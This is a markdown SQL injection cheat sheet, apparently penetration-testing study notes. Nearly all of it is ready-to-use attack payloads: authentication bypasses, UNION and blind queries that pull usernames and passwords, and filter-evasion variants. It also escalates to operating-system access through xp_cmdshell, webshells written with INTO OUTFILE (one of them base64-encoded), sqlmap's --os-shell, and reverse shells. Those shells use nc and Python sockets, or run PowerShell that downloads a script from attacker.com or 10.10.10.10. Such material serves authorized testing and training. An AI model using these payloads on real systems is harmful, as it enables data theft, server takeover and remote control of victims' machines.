# SQL Injection (SQLi) Reference Guide

## Table of Contents
1. [Overview](#overview)
2. [Database Fundamentals](#database-fundamentals)
3. [Attack Types](#attack-types)
   - [Error-Based SQLi](#error-based-sql-injection)
   - [UNION-Based SQLi](#union-based-sql-injection)
   - [Blind SQLi](#blind-sql-injection)
4. [Code Execution](#code-execution)
   - [Manual Code Execution](#manual-code-execution)
   - [Automated Code Execution](#automated-code-execution)
5. [Database-Specific Syntax](#database-specific-syntax)
6. [Testing Methodology](#testing-methodology)
7. [Automation & Tools](#automation--tools)

---

## Overview

- **OWASP Ranking**: A03:2021-Injection (3rd in Top 10)
- **Definition**: Manipulation of SQL queries through unsanitized user input
- **Impact**: Database access, authentication bypass, data extraction
- **Root Cause**: Direct string concatenation without input validation

### Vulnerable Code Pattern
```php
$sql_query = "SELECT * FROM users WHERE user_name= '$uname' AND password='$passwd'";
```

### Basic Attack Example
```sql
-- Normal: SELECT * FROM users WHERE user_name= 'leon'
-- Malicious: leon' OR 1=1-- //
-- Result: SELECT * FROM users WHERE user_name= 'leon' OR 1=1-- //'
```

---

## Database Fundamentals

### Architecture
- **Frontend**: HTML/CSS/JavaScript interface
- **Backend**: PHP/Java/Python application layer  
- **Database**: SQL data storage (MySQL, MSSQL, PostgreSQL, Oracle)

### Basic SQL Syntax
```sql
SELECT * FROM users WHERE user_name='leon'
```
- `SELECT *`: Retrieve all columns
- `FROM users`: Target table
- `WHERE`: Filter condition

---

## Attack Types

## Error-Based SQL Injection

**Concept**: Exploit database error messages to extract information
**Requirement**: Application displays database errors

### Detection Payloads
```sql
'                    -- Basic quote test
admin'--             -- Comment injection
' OR 1=1-- //        -- Boolean test
```

### Authentication Bypass
```sql
' OR 1=1-- //                    -- Always true condition
admin' OR 'a'='a'-- //           -- String comparison bypass
1 OR 1=1-- //                    -- Numeric field bypass
```

### Information Extraction
```sql
-- Database version
' OR 1=1 IN (SELECT @@version)-- //

-- List databases (MySQL)
' OR 1=1 IN (SELECT schema_name FROM information_schema.schemata)-- //

-- Extract user data
' OR 1=1 IN (SELECT password FROM users WHERE username='admin')-- //

-- Concatenated extraction (MySQL)
' OR 1=1 IN (SELECT CONCAT(username,':',password) FROM users)-- //
```

### Advanced Error Functions

**MySQL:**
```sql
-- EXTRACTVALUE (MySQL 5.1+)
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e))-- //

-- UPDATEXML (MySQL 5.1+)  
' AND UPDATEXML(1, CONCAT(0x7e, (SELECT @@version), 0x7e), 1)-- //
```

**MSSQL:**
```sql
-- CAST conversion error
' AND 1=CAST((SELECT @@version) AS INT)-- //

-- CONVERT error
' AND 1=CONVERT(INT, (SELECT @@version))-- //
```

---

## UNION-Based SQL Injection

**Concept**: Combine results from multiple SELECT statements
**Requirements**: Equal column count + compatible data types

### Column Count Detection
```sql
-- Method 1: ORDER BY
' ORDER BY 1-- //     -- Increment until error
' ORDER BY 5-- //     -- Error: "Unknown column '5'"

-- Method 2: UNION SELECT  
' UNION SELECT 1,2,3,4-- //     -- Success indicates 4 columns
```

### Information Gathering
```sql
-- Basic info extraction
' UNION SELECT null, @@version, database(), user()-- //

-- Database enumeration
' UNION SELECT null, schema_name, null, null FROM information_schema.schemata-- //

-- Table enumeration  
' UNION SELECT null, table_name, null, null FROM information_schema.tables WHERE table_schema=database()-- //

-- Data extraction
' UNION SELECT null, username, password, null FROM users-- //
```

### Handling Column Mismatches
```sql
-- Use NULL for missing columns (recommended)
' UNION SELECT username, password, NULL, NULL FROM users-- //

-- Use numbers for tracking
' UNION SELECT username, password, 3, 4 FROM users-- //
```

### Advanced Techniques
```sql
-- Multiple table joins
' UNION SELECT u.username, u.password, p.data, null FROM users u JOIN profiles p ON u.id=p.user_id-- //

-- Conditional extraction
' UNION SELECT null, CASE WHEN LENGTH(password)>10 THEN username ELSE 'short' END, password, null FROM users-- //
```

---

## Blind SQL Injection

**Concept**: Infer database responses through application behavior
**Types**: Boolean-based (response differences) and Time-based (delays)

### Boolean-Based Blind SQLi

**Detection:**
```sql
' AND 1=1-- //        -- TRUE condition (normal response)
' AND 1=2-- //        -- FALSE condition (different response)
```

**Information Extraction:**
```sql
-- Database version testing
' AND @@version LIKE '8%'-- //

-- Database name length
' AND LENGTH(database())=6-- //

-- Character-by-character extraction  
' AND SUBSTRING(database(),1,1)='o'-- //

-- Table existence
' AND (SELECT COUNT(*) FROM users)>0-- //
```

### Time-Based Blind SQLi

**MySQL Functions:**
```sql
-- Basic delay
' AND IF(1=1,SLEEP(5),0)-- //

-- Conditional delay
' AND IF(database()='offsec',SLEEP(3),0)-- //

-- Alternative: BENCHMARK
' AND IF(1=1,BENCHMARK(5000000,MD5('test')),0)-- //
```

**MSSQL Functions:**
```sql
-- WAITFOR DELAY
' AND IF(1=1,WAITFOR DELAY '00:00:05',0)-- //

-- Heavy query delay
' AND IF(1=1,(SELECT COUNT(*) FROM sysusers AS s1, sysusers AS s2),0)-- //
```

### Optimization Techniques
```sql
-- Binary search for faster extraction
' AND IF(ASCII(SUBSTRING(database(),1,1))>100,SLEEP(2),0)-- //

-- Batch testing
' AND IF(LENGTH(database())=6 AND SUBSTRING(database(),1,1)='o',SLEEP(3),0)-- //

-- EXISTS for faster boolean checks
' AND IF(EXISTS(SELECT 1 FROM users WHERE username='admin'),SLEEP(2),0)-- //
```

---

## Code Execution

**Concept**: Escalate SQLi to operating system command execution
**Requirements**: Database privileges, writable directories, specific database functions

## Manual Code Execution

### MSSQL - xp_cmdshell

**Prerequisites**: Administrator privileges, xp_cmdshell enabled
**Function**: Executes Windows shell commands through SQL

#### Connection & Execution Example
```bash
# Connect to MSSQL
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth

# Enable and use xp_cmdshell
SQL> EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE;
SQL> EXECUTE sp_configure 'xp_cmdshell', 1; RECONFIGURE;
SQL> EXECUTE xp_cmdshell 'whoami';
```
#### Execute Commands
```sql
-- Basic command execution
EXECUTE xp_cmdshell 'whoami';
EXECUTE xp_cmdshell 'dir C:\';
EXECUTE xp_cmdshell 'net user';

-- SQLi payload with xp_cmdshell
' UNION SELECT null, null, null, null; EXEC xp_cmdshell 'whoami'-- //
```

### MySQL - INTO OUTFILE

**Prerequisites**: FILE privileges, writable web directory
**Method**: Write PHP webshell to accessible web folder

#### Write Webshell
```sql
-- Basic webshell creation
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null 
  INTO OUTFILE "/var/www/html/tmp/webshell.php"-- //

-- Advanced webshell with error handling
' UNION SELECT "<?php if(isset($_GET['cmd'])){echo '<pre>'.shell_exec($_GET['cmd']).'</pre>';} ?>", null, null, null, null 
  INTO OUTFILE "/tmp/shell.php"-- //
```

#### Access Webshell
```bash
# Execute commands via webshell
curl "http://target.com/tmp/webshell.php?cmd=id"
curl "http://target.com/tmp/webshell.php?cmd=whoami"
curl "http://target.com/tmp/webshell.php?cmd=ls -la"
```

#### Common Writable Directories
```
Linux:
/tmp/
/var/tmp/
/var/www/html/tmp/
/var/www/html/uploads/

Windows:
C:\Windows\Temp\
C:\Temp\
C:\inetpub\wwwroot\
```

---

## Automated Code Execution

### SQLMap OS Shell

**Advantages**: Automated exploitation, interactive shell
**Disadvantages**: High traffic volume, low stealth

#### Basic SQLMap Usage
```bash
# Identify SQLi vulnerability
sqlmap -u "http://target.com/page.php?id=1" -p id

# Get interactive OS shell
sqlmap -u "http://target.com/page.php?id=1" -p id --os-shell

# Specify web root directory
sqlmap -u "http://target.com/page.php?id=1" -p id --os-shell --web-root "/var/www/html/tmp"
```

#### POST Request Exploitation
```bash
# Save intercepted POST request to file
# post.txt contains the HTTP request

# Exploit POST parameter
sqlmap -r post.txt -p item --os-shell --web-root "/var/www/html/tmp"
```

#### SQLMap OS Shell Process
1. **Detection**: Identifies SQLi vulnerability type
2. **Fingerprinting**: Determines OS and web server
3. **Language Selection**: Prompts for web app language (PHP/ASP/JSP)
4. **Upload**: Creates and uploads webshell files
5. **Interactive Shell**: Provides command execution interface

#### Example SQLMap Session
```bash
sqlmap -r post.txt -p item --os-shell --web-root "/var/www/html/tmp"

# SQLMap prompts:
# [1] ASP
# [2] ASPX  
# [3] JSP
# [4] PHP (default)
# > 4

# Interactive shell
os-shell> id
os-shell> whoami  
os-shell> pwd
```

### Database-Specific Code Execution Summary

| Database | Method | Requirements | Command |
|----------|--------|--------------|---------|
| **MSSQL** | `xp_cmdshell` | Admin privileges | `EXECUTE xp_cmdshell 'cmd'` |
| **MySQL** | `INTO OUTFILE` | FILE privileges + writable dir | `SELECT '<?php code ?>' INTO OUTFILE '/path/shell.php'` |
| **PostgreSQL** | `COPY` | Superuser privileges | `COPY (SELECT '<?php code ?>') TO '/path/shell.php'` |
| **Oracle** | `UTL_FILE` | Specific privileges | `UTL_FILE.PUT_LINE()` |

### Code Execution Payloads

#### MSSQL xp_cmdshell Payloads
```sql
-- Enable and execute in one payload
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'whoami'-- //

-- Reverse shell payload
'; EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(\"http://attacker.com/shell.ps1\")"'-- //
```

#### MySQL Webshell Payloads
```sql
-- Minimal webshell
' UNION SELECT "<?=`$_GET[0]`?>", null, null INTO OUTFILE "/tmp/s.php"-- //

-- Full-featured webshell
' UNION SELECT "<?php $cmd=$_GET['cmd']; if($cmd){echo '<pre>'.shell_exec($cmd).'</pre>';} ?>", null, null INTO OUTFILE "/var/www/html/cmd.php"-- //

-- Base64 encoded webshell (bypass filters)
' UNION SELECT FROM_BASE64("PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+"), null, null INTO OUTFILE "/tmp/shell.php"-- //
```

### Upgrading to Full Shell

#### From Webshell to Reverse Shell
```bash
# Python reverse shell via webshell
curl "http://target.com/shell.php?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.10.10\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"

# Netcat reverse shell
curl "http://target.com/shell.php?cmd=nc -e /bin/bash 10.10.10.10 4444"

# PowerShell reverse shell (Windows)
curl "http://target.com/shell.php?cmd=powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10/shell.ps1')\""
```

#### Listener Setup
```bash
# Set up netcat listener
nc -lvnp 4444

# Set up multi-handler (Metasploit)
msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 10.10.10.10; set LPORT 4444; run"
```

---

## Database-Specific Syntax

### MySQL vs MSSQL Comparison

| Feature | MySQL | MSSQL |
|---------|-------|-------|
| **Default Port** | 3306 | 1433 |
| **Version Function** | `version()` or `@@version` | `@@version` |
| **User Function** | `system_user()` | `USER_NAME()` |
| **List Databases** | `SHOW databases;` | `SELECT name FROM sys.databases;` |
| **Schema Format** | `database.table` | `database.schema.table` |
| **Comments** | `-- //`, `#`, `/* */` | `--`, `/* */` |
| **Time Function** | `SLEEP()` | `WAITFOR DELAY` |
| **Concatenation** | `CONCAT()` | `+` operator |

### Connection Commands
```bash
# MySQL
mysql -u root -p'password' -h target -P 3306

# MSSQL (Kali Linux)
impacket-mssqlclient user:pass@target -windows-auth
```

### Core Functions
```sql
-- MySQL
SELECT version(), database(), user();
SHOW databases;
SELECT table_name FROM information_schema.tables WHERE table_schema=database();

-- MSSQL  
SELECT @@version, DB_NAME(), USER_NAME();
SELECT name FROM sys.databases;
SELECT table_name FROM information_schema.tables;
```

---

## Testing Methodology

### SQLi Detection Checklist
- [ ] Test single/double quotes for errors
- [ ] Test comment syntax (`--`, `#`, `/* */`)
- [ ] Test boolean conditions (`1=1` vs `1=2`)
- [ ] Test time delays (`SLEEP()`, `WAITFOR DELAY`)
- [ ] Test UNION injection with column detection

### Attack Progression
1. **Detection**: Identify injection points
2. **Fingerprinting**: Determine database type/version
3. **Enumeration**: Map database structure  
4. **Extraction**: Retrieve sensitive data
5. **Automation**: Use tools for complex extraction

### Common Error Messages
```
MySQL: "You have an error in your SQL syntax"
MSSQL: "Conversion failed when converting varchar value"
Column Count: "The used SELECT statements have different number of columns"
```

---

## Automation & Tools

### SQLMap Usage
```bash
# Basic scan
sqlmap -u "http://target.com/page.php?id=1"

# Specific techniques
sqlmap -u "http://target.com/page.php?id=1" --technique=BEUST
# B=Boolean, E=Error, U=Union, S=Stacked, T=Time

# Database enumeration
sqlmap -u "http://target.com/page.php?id=1" --dbs
sqlmap -u "http://target.com/page.php?id=1" -D database --tables
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump
```

### Performance Comparison
| Technique | Speed | Stealth | Requirements |
|-----------|-------|---------|--------------|
| **Error-Based** | Medium | Low | Error display |
| **UNION-Based** | Fast | Low | Column matching |
| **Boolean Blind** | Fast | Medium | Response differences |
| **Time-Based Blind** | Slow | High | Time delays |

### Time Estimates
- **Boolean-based**: ~1-2 seconds per character
- **Time-based**: ~3-5 seconds per character + delay
- **Binary search optimization**: ~50% reduction in attempts
- **Full database extraction**: Hours without automation

---

## Key Payloads Quick Reference

### Authentication Bypass
```sql
' OR 1=1-- //
admin' OR 'a'='a'-- //
' OR 1=1 #
```

### Information Extraction
```sql
-- Error-based
' OR 1=1 IN (SELECT @@version)-- //
' OR 1=1 IN (SELECT table_name FROM information_schema.tables)-- //

-- UNION-based  
' UNION SELECT null, @@version, database(), user()-- //
' UNION SELECT null, username, password, null FROM users-- //

-- Boolean blind
' AND LENGTH(database())=6-- //
' AND SUBSTRING(database(),1,1)='o'-- //

-- Time-based blind
' AND IF(database()='offsec',SLEEP(3),0)-- //
' AND IF((SELECT COUNT(*) FROM users)>0,SLEEP(2),0)-- //
```

### Filter Bypasses
```sql
-- Case variation
' uNiOn SeLeCt null,username,password,null FROM users-- //

-- Comment insertion
' UNION/**/SELECT/**/null,username-- //

-- URL encoding
'%20OR%201=1--%20//

-- Double encoding
'%2527%2520OR%25201=1
```
